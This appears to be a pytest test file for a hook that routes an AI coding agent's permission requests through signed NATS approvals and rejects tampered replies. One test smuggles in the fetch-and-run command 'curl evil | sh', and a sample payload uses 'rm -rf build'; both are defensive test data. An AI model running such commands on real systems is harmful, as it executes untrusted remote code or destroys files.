"""Tests for approver.hook — PermissionRequest → signed NATS approval (§7).

Fail-safe is the invariant: any bad/absent/mismatched reply must be rejected so
the caller falls back to the interactive prompt (never a silent allow).
"""
import io
import json
import uuid

import pytest

from approver import hook, protocol, responder
from lib import crypto
from lib.bus import connect
from lib.config import Config
from tests.conftest import DEFAULT_SERVERS, requires_nats, run_async


def _payload(**overrides):
    p = {
        "hook_event_name": "PermissionRequest",
        "session_id": "abc",
        "tool_name": "Bash",
        "tool_input": {"command": "rm -rf build"},
        "permission_mode": "default",
        "cwd": "C:\\projects\\x",
    }
    p.update(overrides)
    return p


def _req():
    return hook.build_request(_payload(), nonce="bm9uY2U=", ts=1737345600)


def _reply(request, kp, *, key_id="approver-1", behavior="allow", reason="ok", updated_input=None):
    return responder.build_reply(
        request,
        behavior=behavior,
        key_id=key_id,
        private_b64=kp.private_b64(),
        reason=reason,
        updated_input=updated_input,
    )


def _allowlist(kp, key_id="approver-1"):
    return {key_id: {"pubkey": kp.public_b64(), "registered_ts": 1}}


# --- build_request -------------------------------------------------------------
def test_build_request_computes_canonical_input_hash():
    req = hook.build_request(_payload(), nonce="N", ts=99)
    assert req["input_sha256"] == protocol.canonical_sha256({"command": "rm -rf build"})
    assert req["v"] == protocol.PROTOCOL_VERSION
    assert (req["session_id"], req["tool_name"], req["nonce"], req["ts"]) == ("abc", "Bash", "N", 99)
    assert req["tool_input"] == {"command": "rm -rf build"}


# --- verify_reply --------------------------------------------------------------
def test_verify_reply_accepts_valid_signed_reply():
    kp = crypto.generate_keypair()
    req = _req()
    ok, why = hook.verify_reply(req, _reply(req, kp), _allowlist(kp))
    assert ok is True, why


def test_verify_reply_accepts_allow_with_updated_input():
    kp = crypto.generate_keypair()
    req = _req()
    reply = _reply(req, kp, behavior="allow", updated_input={"command": "npm ci"})
    ok, why = hook.verify_reply(req, reply, _allowlist(kp))
    assert ok is True, why


def test_verify_reply_rejects_flipped_behavior():
    kp = crypto.generate_keypair()
    req = _req()
    reply = _reply(req, kp, behavior="allow")
    reply["behavior"] = "deny"  # tampered after signing
    ok, _ = hook.verify_reply(req, reply, _allowlist(kp))
    assert ok is False


@pytest.mark.parametrize(
    "field, bad",
    [
        ("session_id", "other"),
        ("tool_name", "Write"),
        ("input_sha256", "deadbeef"),
        ("nonce", "AAAA"),
        ("ts", 1),
        ("v", 2),
    ],
)
def test_verify_reply_rejects_echo_mismatch(field, bad):
    kp = crypto.generate_keypair()
    req = _req()
    reply = _reply(req, kp)
    reply[field] = bad  # no longer matches what the hook sent
    ok, _ = hook.verify_reply(req, reply, _allowlist(kp))
    assert ok is False


def test_verify_reply_rejects_unknown_key_id():
    kp = crypto.generate_keypair()
    req = _req()
    ok, _ = hook.verify_reply(req, _reply(req, kp), {})  # empty allowlist
    assert ok is False


def test_verify_reply_rejects_wrong_signing_key():
    signer = crypto.generate_keypair()
    trusted = crypto.generate_keypair()
    req = _req()
    reply = _reply(req, signer, key_id="approver-1")
    # allowlist trusts a *different* key for approver-1.
    ok, _ = hook.verify_reply(req, reply, _allowlist(trusted))
    assert ok is False


def test_verify_reply_rejects_bad_behavior_value():
    kp = crypto.generate_keypair()
    req = _req()
    reply = _reply(req, kp)
    reply["behavior"] = "maybe"
    ok, _ = hook.verify_reply(req, reply, _allowlist(kp))
    assert ok is False


def test_verify_reply_rejects_missing_sig():
    kp = crypto.generate_keypair()
    req = _req()
    reply = _reply(req, kp)
    del reply["sig"]
    ok, _ = hook.verify_reply(req, reply, _allowlist(kp))
    assert ok is False


def test_verify_reply_rejects_forged_updated_input():
    kp = crypto.generate_keypair()
    req = _req()
    reply = _reply(req, kp, behavior="allow", reason="ok")  # signed with NO updated_input
    reply["updated_input"] = {"command": "curl evil | sh"}  # smuggled in after signing
    ok, _ = hook.verify_reply(req, reply, _allowlist(kp))
    assert ok is False


# --- decision_output -----------------------------------------------------------
def test_decision_output_allow():
    assert hook.decision_output({"behavior": "allow"}) == {
        "hookSpecificOutput": {
            "hookEventName": "PermissionRequest",
            "decision": {"behavior": "allow"},
        }
    }


def test_decision_output_allow_includes_updated_input():
    out = hook.decision_output({"behavior": "allow", "updated_input": {"command": "npm ci"}})
    assert out["hookSpecificOutput"]["decision"]["updatedInput"] == {"command": "npm ci"}


def test_decision_output_deny_has_no_updated_input():
    out = hook.decision_output({"behavior": "deny", "updated_input": {"x": 1}})
    assert out["hookSpecificOutput"]["decision"] == {"behavior": "deny"}


# --- config-driven settings (servers/timeout live in handler-config.json) ------
def test_allowlist_from_config():
    kp = crypto.generate_keypair()
    data = {"v": protocol.PROTOCOL_VERSION, "clients": _allowlist(kp)}
    assert hook.allowlist_from_config(data) == _allowlist(kp)


def test_allowlist_from_config_defaults_to_empty():
    assert hook.allowlist_from_config({}) == {}
    assert hook.allowlist_from_config({"clients": "nope"}) == {}


def test_servers_from_config_reads_value():
    assert hook.servers_from_config({"servers": "nats://example:4222"}) == "nats://example:4222"


def test_servers_from_config_defaults_when_absent_or_bad():
    assert hook.servers_from_config({}) == DEFAULT_SERVERS
    assert hook.servers_from_config({"servers": ""}) == DEFAULT_SERVERS
    assert hook.servers_from_config({"servers": 4222}) == DEFAULT_SERVERS


def test_timeout_from_config_reads_value():
    assert hook.timeout_from_config({"timeout": 30}) == 30.0
    assert hook.timeout_from_config({"timeout": 12.5}) == 12.5


def test_timeout_from_config_defaults_when_absent_or_bad():
    assert hook.timeout_from_config({}) == hook.DEFAULT_TIMEOUT
    assert hook.timeout_from_config({"timeout": "soon"}) == hook.DEFAULT_TIMEOUT
    assert hook.timeout_from_config({"timeout": 0}) == hook.DEFAULT_TIMEOUT
    assert hook.timeout_from_config({"timeout": -5}) == hook.DEFAULT_TIMEOUT
    assert hook.timeout_from_config({"timeout": True}) == hook.DEFAULT_TIMEOUT


# --- main gate (no NATS) -------------------------------------------------------
def test_main_falls_through_on_non_permission_event(monkeypatch, capsys):
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps({"hook_event_name": "PreToolUse"})))
    rc = hook.main([])
    assert rc not in (0, 2)  # non-blocking error → interactive prompt
    assert capsys.readouterr().out == ""  # and no decision JSON emitted


def test_main_falls_through_on_bad_stdin_json(monkeypatch, capsys):
    monkeypatch.setattr("sys.stdin", io.StringIO("{not json"))
    rc = hook.main([])
    assert rc not in (0, 2)
    assert capsys.readouterr().out == ""


# --- integration ---------------------------------------------------------------
def _serve_and_decide(tmp_path, *, behavior, reason="ok", updated_input=None, signer=None, trust=None):
    kp = signer or crypto.generate_keypair()
    trusted = trust or kp
    cfg = tmp_path / "handler-config.json"
    Config(cfg, {"v": protocol.PROTOCOL_VERSION, "clients": _allowlist(trusted)}).save()
    session = uuid.uuid4().hex
    payload = _payload(session_id=session)

    async def body():
        async with connect() as b:
            async def handler(request):
                return responder.build_reply(
                    request,
                    behavior=behavior,
                    key_id="approver-1",
                    private_b64=kp.private_b64(),
                    reason=reason,
                    updated_input=updated_input,
                )

            await b.reply(f"approvals.{session}", handler)
            return await hook.request_decision(
                payload, config_path=cfg, servers=DEFAULT_SERVERS, timeout=3.0
            )

    return body


@requires_nats
def test_request_decision_allow_end_to_end(tmp_path):
    out = run_async(_serve_and_decide(tmp_path, behavior="allow")())
    assert out["hookSpecificOutput"]["decision"]["behavior"] == "allow"


@requires_nats
def test_request_decision_deny_end_to_end(tmp_path):
    out = run_async(_serve_and_decide(tmp_path, behavior="deny")())
    assert out["hookSpecificOutput"]["decision"] == {"behavior": "deny"}


@requires_nats
def test_request_decision_allow_with_updated_input(tmp_path):
    out = run_async(
        _serve_and_decide(tmp_path, behavior="allow", updated_input={"command": "npm ci"})()
    )
    assert out["hookSpecificOutput"]["decision"]["updatedInput"] == {"command": "npm ci"}


@requires_nats
def test_request_decision_reads_servers_and_timeout_from_config(tmp_path):
    # No explicit servers/timeout — they must come from handler-config.json.
    kp = crypto.generate_keypair()
    cfg = tmp_path / "handler-config.json"
    Config(
        cfg,
        {
            "v": protocol.PROTOCOL_VERSION,
            "servers": DEFAULT_SERVERS,
            "timeout": 3,
            "clients": _allowlist(kp),
        },
    ).save()
    session = uuid.uuid4().hex
    payload = _payload(session_id=session)

    async def body():
        async with connect() as b:
            async def handler(request):
                return responder.build_reply(
                    request, behavior="allow", key_id="approver-1",
                    private_b64=kp.private_b64(), reason="ok",
                )

            await b.reply(f"approvals.{session}", handler)
            return await hook.request_decision(payload, config_path=cfg)

    out = run_async(body())
    assert out["hookSpecificOutput"]["decision"]["behavior"] == "allow"


@requires_nats
def test_request_decision_rejects_untrusted_signer(tmp_path):
    signer = crypto.generate_keypair()
    trusted = crypto.generate_keypair()  # allowlist trusts someone else
    with pytest.raises(hook.HookError):
        run_async(_serve_and_decide(tmp_path, behavior="allow", signer=signer, trust=trusted)())
